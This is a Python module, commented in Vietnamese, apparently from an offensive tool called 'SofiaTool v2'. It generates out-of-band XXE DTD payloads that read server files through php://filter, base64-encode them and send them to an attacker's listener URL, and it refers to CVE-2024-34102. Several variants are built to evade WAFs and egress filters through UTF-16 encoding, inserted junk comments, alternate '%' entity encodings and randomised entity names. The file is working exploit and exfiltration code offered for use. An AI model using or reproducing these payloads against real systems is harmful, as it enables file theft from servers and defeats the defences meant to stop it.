"""SofiaTool v2 — DTD động tự sinh (phục vụ listener).

generate(token, path) tạo DTD exfil php://filter base64-encode cho một path —
path chỉ nằm trong map listener, không bao giờ xuất hiện trên URL.

Các variant:
  variant_utf16()           — DTD encode UTF-16-LE + BOM (né egress filter
                              quét plaintext "SYSTEM"/"php://").
  variant_comment_junk()    — comment vô hại chen giữa các entity.
  variant_entity_encoding() — nhúng '%' theo 2 kiểu: &#x25; và &#37;.
"""
from waf.mutator import _JUNK_COMMENTS, _JUNK_WS  # tái sử dụng junk list
from core.logger import get_logger

log = get_logger()

EXFIL_BASE = "/exfil"  # path trên listener; host do tunnel quyết định


def generate(token, path, tunnel_base, entity_pct="&#x25;", junk=False,
             encoding="utf-8", names=None):
    """Tạo DTD exfil. Trả bytes (đã encode theo `encoding`).

    Chain (tương thích PHP/libxml — public PoC CVE-2024-34102):
      %data  = php://filter base64-encode đọc file
      %eval  = khai báo %exfil; &#x25; = '%' (tránh expand sớm). URL dùng
               &amp; (general entity ref KHÔNG bị expand trong entity value;
               listener normalize '&amp;' -> '&' khi nhận callback)
      %eval; %exfil;  -> instantiate param entity ở DTD level -> HTTP GET
                         tới listener (KHÔNG cần NOENT)

    names=(data, eval, exfil) — tên entity ngẫu nhiên để né signature khớp
    đúng chuỗi `% data`/`%eval;`/`exfil` trên DTD.
    """
    data_n, eval_n, exfil_n = names or ("data", "eval", "exfil")
    pct = entity_pct  # '%' được nhúng qua entity ref để tránh mở rộng sớm
    lines = [
        f'<!ENTITY % {data_n} SYSTEM "php://filter/convert.base64-encode/resource='
        f'{path}">',
        f"<!ENTITY % {eval_n} \"<!ENTITY {pct} {exfil_n} SYSTEM "
        f"'{tunnel_base}{EXFIL_BASE}?t={token}&amp;data=%{data_n};\'>\">",
        f"%{eval_n};",
        f"%{exfil_n};",
    ]
    if junk:
        import random
        rng = random.Random()
        body = "\n".join(
            line + (rng.choice(["", ""]) + rng.choice(_JUNK_COMMENTS)
                    if rng.random() < 0.5 and i < len(lines) - 1 else "")
            for i, line in enumerate(lines)
        )
    else:
        body = "\n".join(lines)
    body = body + "\n"
    return _encode(body, encoding)


def variant_utf16(token, path, tunnel_base):
    """DTD UTF-16-LE + BOM — WAF quét plaintext sẽ không thấy signature."""
    return generate(token, path, tunnel_base, entity_pct="&#x25;",
                    encoding="utf-16")


def variant_comment_junk(token, path, tunnel_base):
    return generate(token, path, tunnel_base, entity_pct="&#x25;", junk=True)


def variant_entity_encoding(token, path, tunnel_base, pct="&#37;"):
    """Biến thể nhúng '%' theo kiểu &#37; thay vì &#x25;."""
    return generate(token, path, tunnel_base, entity_pct=pct)


def variant_random_names(token, path, tunnel_base, junk=True):
    """Tên entity data/eval/exfil ngẫu nhiên + junk comment (né signature)."""
    import random
    rng = random.Random()
    names = tuple(
        "".join(rng.choice("abcdefghijklmnopqrstuvwxyz")
                 for _ in range(rng.randint(1, 3)))
        for _ in range(3)
    )
    return generate(token, path, tunnel_base, entity_pct="&#x25;",
                    junk=junk, names=names)


def _encode(text, encoding):
    if encoding == "utf-16":
        return ("\ufeff" + text).encode("utf-16-le")
    return text.encode("utf-8")



